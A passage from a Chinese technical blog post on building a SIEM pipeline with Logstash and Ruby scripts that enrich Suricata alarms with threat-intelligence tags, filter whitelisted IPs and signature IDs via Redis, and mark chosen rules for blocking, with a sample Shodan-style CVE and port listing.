class="keyword">end</span></span><br></pre></td></tr></table></figure>

<h6 id="示例-3"><a href="#示例-3" class="headerlink" title="示例"></a><strong>示例</strong></h6><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;threat&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">&quot;hunting&quot;</span>: &#123;</span><br><span class="line">            <span class="attr">&quot;vulns&quot;</span>: [</span><br><span class="line">                <span class="string">&quot;CVE-2019-0220&quot;</span>,</span><br><span class="line">                <span class="string">&quot;CVE-2019-0197&quot;</span>,</span><br><span class="line">                <span class="string">&quot;CVE-2019-0196&quot;</span>,</span><br><span class="line">                <span class="string">&quot;CVE-2018-1302&quot;</span>,</span><br><span class="line">                <span class="string">&quot;CVE-2019-0211&quot;</span>,</span><br><span class="line">                <span class="string">&quot;CVE-2017-15710&quot;</span>,</span><br><span class="line">                <span class="string">&quot;CVE-2018-1301&quot;</span>,</span><br><span class="line">                <span class="string">&quot;CVE-2018-1283&quot;</span>,</span><br><span class="line">                <span class="string">&quot;CVE-2018-1303&quot;</span>,</span><br><span class="line">                <span class="string">&quot;CVE-2017-15715&quot;</span>,</span><br><span class="line">                <span class="string">&quot;CVE-2018-1333&quot;</span>,</span><br><span class="line">                <span class="string">&quot;CVE-2018-17199&quot;</span>,</span><br><span class="line">                <span class="string">&quot;CVE-2018-11763&quot;</span>,</span><br><span class="line">                <span class="string">&quot;CVE-2018-1312&quot;</span></span><br><span class="line">            ],</span><br><span class="line">            <span class="attr">&quot;domains&quot;</span>: [],</span><br><span class="line">            <span class="attr">&quot;ports&quot;</span>: [</span><br><span class="line">                <span class="number">8888</span>,</span><br><span class="line">                <span class="number">80</span>,</span><br><span class="line">                <span class="number">8080</span>,</span><br><span class="line">                <span class="number">8090</span>,</span><br><span class="line">                <span class="number">22</span></span><br><span class="line">            ],</span><br><span class="line">            <span class="attr">&quot;details&quot;</span>: <span class="string">&quot;&#123;\&quot;tcp\&quot;:[&#123;\&quot;http-simple-new\&quot;:8888,\&quot;Apache httpd\&quot;:\&quot;2.4.29\&quot;&#125;,&#123;\&quot;http\&quot;:80,\&quot;Apache httpd\&quot;:\&quot;2.4.29\&quot;&#125;,&#123;\&quot;http\&quot;:8080,\&quot;Apache httpd\&quot;:\&quot;2.4.29\&quot;&#125;,&#123;\&quot;http-simple-new\&quot;:8090&#125;,&#123;\&quot;ssh\&quot;:22,\&quot;OpenSSH\&quot;:\&quot;7.6p1 Ubuntu-4ubuntu0.3\&quot;&#125;],\&quot;udp\&quot;:[]&#125;&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;hostnames&quot;</span>: [],</span><br><span class="line">            <span class="attr">&quot;services&quot;</span>: [</span><br><span class="line">                <span class="string">&quot;http-simple-new&quot;</span>,</span><br><span class="line">                <span class="string">&quot;ssh&quot;</span>,</span><br><span class="line">                <span class="string">&quot;http&quot;</span></span><br><span class="line">            ]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2021/02/02/SIEM%EF%BC%88%E4%B8%80%EF%BC%89/threat.hunting.shodan-1.png" alt="image-20201205151011258"></p>
<p><img src="/2021/02/02/SIEM%EF%BC%88%E4%B8%80%EF%BC%89/threat.hunting.shodan-2.png" alt="image-20201205150744102"></p>
<h5 id="3-2-2-add-ti-tags"><a href="#3-2-2-add-ti-tags" class="headerlink" title="3.2.2 add-ti_tags"></a>3.2.2 add-ti_tags</h5><p>​    这部分通常是对接的自有情报（<em>我们会收集攻击过我们的IP，建立适用于自己的内部情报。</em>）以及开源情报。原则上SIEM产生的alarm事件并不会很多，所以这边直接从Elastic获取了情报数据进行告警的丰富化。如果alarm事件很多的话，建议也是放在Redis或者再考虑其他方案。近期准备采购商业情报，后期将会有一个商业情报的对接过程。</p>
<h6 id="Logstash-Config-13"><a href="#Logstash-Config-13" class="headerlink" title="Logstash Config"></a><strong>Logstash Config</strong></h6><ul>
<li><strong><a target="_blank" rel="noopener" href="https://github.com/Canon88/suricata-scripts/blob/master/Suricata_ECS/logstash/conf.d/from_siem_to_es/80_add-ti_tags.conf">add-ti_tags.conf</a></strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">filter &#123;</span><br><span class="line">    <span class="keyword">if</span> [event][kind] == <span class="string">&quot;alarm&quot;</span> &#123;</span><br><span class="line">        ruby &#123;</span><br><span class="line">            path =&gt; <span class="string">&quot;/etc/logstash/scripts/siem-ti_tags.rb&quot;</span></span><br><span class="line">            script_params =&gt; &#123;</span><br><span class="line">                <span class="string">&quot;index&quot;</span> =&gt; <span class="string">&quot;ecs-ti-*&quot;</span></span><br><span class="line">                <span class="string">&quot;urls&quot;</span> =&gt; <span class="string">&quot;https://elastic:HelloWorld@127.0.0.1:9200&quot;</span></span><br><span class="line">                <span class="string">&quot;ca&quot;</span> =&gt; <span class="string">&quot;ca.crt&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h6 id="Ruby-Code-5"><a href="#Ruby-Code-5" class="headerlink" title="Ruby Code"></a><strong>Ruby Code</strong></h6><ul>
<li><strong><a target="_blank" rel="noopener" href="https://github.com/Canon88/suricata-scripts/blob/master/Suricata_ECS/logstash/scripts/ti_tags.rb">add-ti_tags.rb</a></strong></li>
</ul>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">require</span> <span class="string">&#x27;json&#x27;</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;elasticsearch&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">register</span><span class="params">(params)</span></span></span><br><span class="line">    <span class="variable">@urls</span> = params[<span class="string">&quot;urls&quot;</span>]</span><br><span class="line">    <span class="variable">@index</span> = params[<span class="string">&quot;index&quot;</span>]</span><br><span class="line">    <span class="variable">@ca</span> = params[<span class="string">&quot;ca&quot;</span>]</span><br><span class="line">    <span class="variable">@client</span> = Elasticsearch::Client.new <span class="symbol">urls:</span> <span class="variable">@urls</span>, <span class="symbol">transport_options:</span> &#123; <span class="symbol">ssl:</span> &#123; <span class="symbol">ca_file:</span> <span class="variable">@ca</span> &#125; &#125;</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">filter</span><span class="params">(event)</span></span></span><br><span class="line">    ioc = event.get(<span class="string">&#x27;[source][ip]&#x27;</span>)</span><br><span class="line">    query = &#123;</span><br><span class="line">        <span class="string">&quot;_source&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;includes&quot;</span>: [</span><br><span class="line">                <span class="string">&quot;threat.tags&quot;</span>,</span><br><span class="line">                <span class="string">&quot;threat.provider&quot;</span></span><br><span class="line">            ]</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="string">&quot;query&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;bool&quot;</span>: &#123;</span><br><span class="line">                <span class="string">&quot;must&quot;</span>: [</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="string">&quot;terms&quot;</span>: &#123;</span><br><span class="line">                            <span class="string">&quot;threat.type&quot;</span>: [</span><br><span class="line">                                <span class="string">&quot;ipv4&quot;</span>,</span><br><span class="line">                                <span class="string">&quot;ip&quot;</span></span><br><span class="line">                            ]</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;,</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="string">&quot;term&quot;</span>: &#123;</span><br><span class="line">                            <span class="string">&quot;threat.ioc&quot;</span>: ioc</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                ],</span><br><span class="line">                <span class="string">&quot;filter&quot;</span>: [</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="string">&quot;range&quot;</span>: &#123;</span><br><span class="line">                            <span class="string">&quot;threat.creation_time&quot;</span>: &#123;</span><br><span class="line">                                <span class="string">&quot;gte&quot;</span>: <span class="string">&quot;now-7d&quot;</span></span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                ]</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="string">&quot;size&quot;</span>: <span class="number">10</span></span><br><span class="line">    &#125;</span><br><span class="line">    response = <span class="variable">@client</span>.search <span class="symbol">index:</span> <span class="variable">@index</span>, <span class="symbol">body:</span> query.to_json</span><br><span class="line"></span><br><span class="line">    tags = []</span><br><span class="line">    providers = []</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> response[<span class="string">&#x27;hits&#x27;</span>][<span class="string">&#x27;hits&#x27;</span>].empty? <span class="keyword">then</span></span><br><span class="line">        response[<span class="string">&#x27;hits&#x27;</span>][<span class="string">&#x27;hits&#x27;</span>].each <span class="keyword">do</span> <span class="params">|result|</span></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> providers.<span class="keyword">include</span>?(result[<span class="string">&quot;_source&quot;</span>][<span class="string">&quot;threat&quot;</span>][<span class="string">&quot;provider&quot;</span>])</span><br><span class="line">                providers.push(result[<span class="string">&quot;_source&quot;</span>][<span class="string">&quot;threat&quot;</span>][<span class="string">&quot;provider&quot;</span>])</span><br><span class="line">            <span class="keyword">end</span></span><br><span class="line">            tags = tags - result[<span class="string">&quot;_source&quot;</span>][<span class="string">&quot;threat&quot;</span>][<span class="string">&quot;tags&quot;</span>]</span><br><span class="line">            tags = tags + result[<span class="string">&quot;_source&quot;</span>][<span class="string">&quot;threat&quot;</span>][<span class="string">&quot;tags&quot;</span>]</span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">    event.set(<span class="string">&#x27;[threat][intelligence][tags]&#x27;</span>, tags)</span><br><span class="line">    event.set(<span class="string">&#x27;[threat][intelligence][providers]&#x27;</span>, providers)</span><br><span class="line">    <span class="keyword">return</span> [event]</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>

<h6 id="示例-4"><a href="#示例-4" class="headerlink" title="示例"></a><strong>示例</strong></h6><p><img src="/2021/02/02/SIEM%EF%BC%88%E4%B8%80%EF%BC%89/threat.hunting.shodan-3.png" alt="image-20201208144650226"></p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;threat&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">&quot;intelligence&quot;</span>: &#123;</span><br><span class="line">            <span class="attr">&quot;providers&quot;</span>: [</span><br><span class="line">                <span class="string">&quot;NTA&quot;</span></span><br><span class="line">            ],</span><br><span class="line">            <span class="attr">&quot;tags&quot;</span>: [</span><br><span class="line">                <span class="string">&quot;WebAttack&quot;</span></span><br><span class="line">            ]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="4-Filter"><a href="#4-Filter" class="headerlink" title="4. Filter"></a>4. Filter</h3><p><img src="/2021/02/02/SIEM%EF%BC%88%E4%B8%80%EF%BC%89/blacklist-1.png" alt="image-20201207153152332"></p>
<h4 id="4-1-alert-to-siem"><a href="#4-1-alert-to-siem" class="headerlink" title="4.1 alert_to_siem"></a>4.1 alert_to_siem</h4><h5 id="4-1-1-filter-ip-from-alert"><a href="#4-1-1-filter-ip-from-alert" class="headerlink" title="4.1.1 filter_ip_from_alert"></a>4.1.1 filter_ip_from_alert</h5><p>​        实际使用场景中需要对一些白名单IP、特定签名规则进行过滤。这么做也是为了保证SIEM的性能以及告警的可靠性。这部分数据依旧会发送到Elastic作为历史数据留存，但不会被SIEM消费并产生告警。</p>
<h6 id="Logstash-Config-14"><a href="#Logstash-Config-14" class="headerlink" title="Logstash Config"></a><strong>Logstash Config</strong></h6><p>​    利用<strong>Clone</strong>插件，将需要被SIEM消费的数据经由脚本过滤。</p>
<ul>
<li><strong><a target="_blank" rel="noopener" href="https://github.com/Canon88/suricata-scripts/blob/master/Suricata_ECS/logstash/conf.d/from_suricata_to_siem/80_add-siem_events.conf">filter_ip_from_alert.conf</a></strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">filter &#123;</span><br><span class="line">    <span class="keyword">if</span> [suricata][eve][alert] &#123;</span><br><span class="line">        <span class="built_in">clone</span> &#123;</span><br><span class="line">            clones =&gt; [ <span class="string">&quot;siem_events&quot;</span> ]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">filter &#123;</span><br><span class="line">    <span class="keyword">if</span> [<span class="built_in">type</span>] == <span class="string">&quot;siem_events&quot;</span> &#123;</span><br><span class="line">        ruby &#123;</span><br><span class="line">            path =&gt; <span class="string">&quot;/etc/logstash/scripts/siem-filter_ip.rb&quot;</span></span><br><span class="line">            script_params =&gt; &#123;</span><br><span class="line">                <span class="string">&quot;host&quot;</span> =&gt; <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line">                <span class="string">&quot;port&quot;</span> =&gt; 6379</span><br><span class="line">                <span class="string">&quot;password&quot;</span> =&gt; <span class="string">&quot;HelloWorld&quot;</span></span><br><span class="line">                <span class="string">&quot;cdn_db&quot;</span> =&gt; 3</span><br><span class="line">                <span class="string">&quot;scan_db&quot;</span> =&gt; 4</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h6 id="Ruby-Code-6"><a href="#Ruby-Code-6" class="headerlink" title="Ruby Code"></a><strong>Ruby Code</strong></h6><ul>
<li><strong><a target="_blank" rel="noopener" href="https://github.com/Canon88/suricata-scripts/blob/master/Suricata_ECS/logstash/scripts/siem-filter_ip.rb">filter_ip_from_alert.rb</a></strong></li>
</ul>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">require</span> <span class="string">&quot;redis&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">register</span><span class="params">(params)</span></span></span><br><span class="line">    <span class="keyword">begin</span></span><br><span class="line">        <span class="variable">@cdn_db</span> = Redis.new(<span class="symbol">host:</span>params[<span class="string">&quot;host&quot;</span>], <span class="symbol">port:</span>params[<span class="string">&quot;port&quot;</span>], <span class="symbol">password:</span>params[<span class="string">&quot;password&quot;</span>], <span class="symbol">db:</span>params[<span class="string">&quot;cdn_db&quot;</span>])</span><br><span class="line">        <span class="variable">@scan_db</span> = Redis.new(<span class="symbol">host:</span>params[<span class="string">&quot;host&quot;</span>], <span class="symbol">port:</span>params[<span class="string">&quot;port&quot;</span>], <span class="symbol">password:</span>params[<span class="string">&quot;password&quot;</span>], <span class="symbol">db:</span>params[<span class="string">&quot;scan_db&quot;</span>])</span><br><span class="line">    <span class="keyword">rescue</span></span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">filter</span><span class="params">(event)</span></span></span><br><span class="line">    src_ip = event.get(<span class="string">&quot;[source][ip]&quot;</span>)</span><br><span class="line">    dst_ip = event.get(<span class="string">&quot;[destination][ip]&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="variable">@cdn_db</span>.exists?(src_ip) <span class="params">||</span> <span class="variable">@cdn_db</span>.exists?(dst_ip) <span class="params">||</span> <span class="variable">@scan_db</span>.exists?(src_ip) <span class="params">||</span> <span class="variable">@scan_db</span>.exists?(dst_ip) <span class="keyword">then</span></span><br><span class="line">        event.cancel</span><br><span class="line">        <span class="keyword">return</span> []</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> [event]</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>

<h5 id="4-1-2-filter-sid-from-alert"><a href="#4-1-2-filter-sid-from-alert" class="headerlink" title="4.1.2 filter_sid_from_alert"></a>4.1.2 filter_sid_from_alert</h5><h6 id="Logstash-Config-15"><a href="#Logstash-Config-15" class="headerlink" title="Logstash Config"></a><strong>Logstash Config</strong></h6><ul>
<li><strong><a target="_blank" rel="noopener" href="https://github.com/Canon88/suricata-scripts/blob/master/Suricata_ECS/logstash/conf.d/from_suricata_to_siem/80_add-siem_events.conf">filter_sid_from_alert.conf</a></strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">filter &#123;</span><br><span class="line">    <span class="keyword">if</span> [suricata][eve][alert] &#123;</span><br><span class="line">        <span class="built_in">clone</span> &#123;</span><br><span class="line">            clones =&gt; [ <span class="string">&quot;siem_events&quot;</span> ]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">filter &#123;</span><br><span class="line">    <span class="keyword">if</span> [<span class="built_in">type</span>] == <span class="string">&quot;siem_events&quot;</span> &#123;</span><br><span class="line">        ruby &#123;</span><br><span class="line">            path =&gt; <span class="string">&quot;/etc/logstash/scripts/siem-filter_sid.rb&quot;</span></span><br><span class="line">            script_params =&gt; &#123;</span><br><span class="line">                <span class="string">&quot;host&quot;</span> =&gt; <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line">                <span class="string">&quot;port&quot;</span> =&gt; 6379</span><br><span class="line">                <span class="string">&quot;password&quot;</span> =&gt; <span class="string">&quot;HelloWorld&quot;</span></span><br><span class="line">                <span class="string">&quot;sid_db&quot;</span> =&gt; 2</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h6 id="Ruby-Code-7"><a href="#Ruby-Code-7" class="headerlink" title="Ruby Code"></a><strong>Ruby Code</strong></h6><ul>
<li><strong><a target="_blank" rel="noopener" href="https://github.com/Canon88/suricata-scripts/blob/master/Suricata_ECS/logstash/scripts/siem-filter_sid.rb">filter_sid_from_alert.rb</a></strong></li>
</ul>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">require</span> <span class="string">&quot;redis&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">register</span><span class="params">(params)</span></span></span><br><span class="line">    <span class="variable">@signature_id</span> = Redis.new(<span class="symbol">host:</span>params[<span class="string">&quot;host&quot;</span>], <span class="symbol">port:</span>params[<span class="string">&quot;port&quot;</span>], <span class="symbol">password:</span>params[<span class="string">&quot;password&quot;</span>], <span class="symbol">db:</span>params[<span class="string">&quot;sid_db&quot;</span>])</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">filter</span><span class="params">(event)</span></span></span><br><span class="line">    sid = event.get(<span class="string">&quot;[rule][id]&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="variable">@signature_id</span>.exists?(sid) <span class="keyword">then</span></span><br><span class="line">        event.cancel</span><br><span class="line">        <span class="keyword">return</span> []</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">return</span> [event]</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>

<hr>
<h4 id="4-2-alarm-from-siem"><a href="#4-2-alarm-from-siem" class="headerlink" title="4.2 alarm_from_siem"></a>4.2 alarm_from_siem</h4><h5 id="4-2-1-update-action-from-alarm"><a href="#4-2-1-update-action-from-alarm" class="headerlink" title="4.2.1 update_action_from_alarm"></a>4.2.1 update_action_from_alarm</h5><p>​        更新匹配到的<code>rule.id</code>事件，将<code>event.action</code>值更新为：<code>block</code>。便于后期被SIEM联动模块“消费”。如上图中红色线所示部分。主要是为了通过<code>event.action</code>字段来区分SIEM做的自动化操作。</p>
<h6 id="Logstash-Config-16"><a href="#Logstash-Config-16" class="headerlink" title="Logstash Config"></a><strong>Logstash Config</strong></h6><ul>
<li><strong><a target="_blank" rel="noopener" href="https://github.com/Canon88/suricata-scripts/blob/master/Suricata_ECS/logstash/conf.d/from_siem_to_es/80_update-siem_action.conf">update-action_from_alarm.conf</a></strong></li>
</ul>
<p>​    针对指定<code>rule.id</code>事件，将<code>allowed</code>值更新为：<code>block</code>。便于后期被联动模块“消费”。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">filter &#123;</span><br><span class="line">    mutate &#123;</span><br><span class="line">        update =&gt; &#123;</span><br><span class="line">            <span class="string">&quot;[event][action]&quot;</span> =&gt; <span class="string">&quot;allowed&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ruby &#123;</span><br><span class="line">        path =&gt; <span class="string">&quot;/etc/logstash/scripts/siem-update_action.rb&quot;</span></span><br><span class="line">        script_params =&gt; &#123;</span><br><span class="line">            <span class="string">&quot;host&quot;</span> =&gt; <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line">            <span class="string">&quot;port&quot;</span> =&gt; 6379</span><br><span class="line">            <span class="string">&quot;password&quot;</span> =&gt; <span class="string">&quot;HelloWorld&quot;</span></span><br><span class="line">            <span class="string">&quot;siem_action_db&quot;</span> =&gt; 7</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h6 id="Ruby-Code-8"><a href="#Ruby-Code-8" class="headerlink" title="Ruby Code"></a><strong>Ruby Code</strong></h6><ul>
<li><strong><a target="_blank" rel="noopener" href="https://github.com/Canon88/suricata-scripts/blob/master/Suricata_ECS/logstash/scripts/siem-update_action.rb">update_action_from_alarm.rb</a></strong></li>
</ul>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">require</span> <span class="string">&quot;redis&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">register</span><span class="params">(params)</span></span></span><br><span class="line">    <span class="keyword">begin</span></span><br><span class="line">        <span class="variable">@siem_action_db</span> = Redis.new(<span class="symbol">host:</span>params[<span class="string">&quot;host&quot;</span>], <span class="symbol">port:</span>params[<span class="string">&quot;port&quot;</span>], <span class="symbol">password:</span>params[<span class="string">&quot;password&quot;</span>], <span class="symbol">db:</span>params[<span class="string">&quot;siem_action_db&quot;</span>])</span><br><span class="line">    <span class="keyword">rescue</span></span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">filter</span><span class="params">(event)</span></span></span><br><span class="line">    rule_id = event.get(<span class="string">&quot;[rule][id]&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="variable">@siem_action_db</span>.exists?(rule_id) <span class="keyword">then</span></span><br><span class="line">        event.set(<span class="string">&quot;[event][action]&quot;</span>, <span class="string">&quot;block&quot;</span>)</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> [event]</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>

<h6 id="示例："><a href="#示例：" class="headerlink" title="示例："></a><strong>示例：</strong></h6><p><img src="/2021/02/02/SIEM%EF%BC%88%E4%B8%80%EF%BC%89/update_action-0.1.png" alt="image-20201207111416997"></p>
<hr>
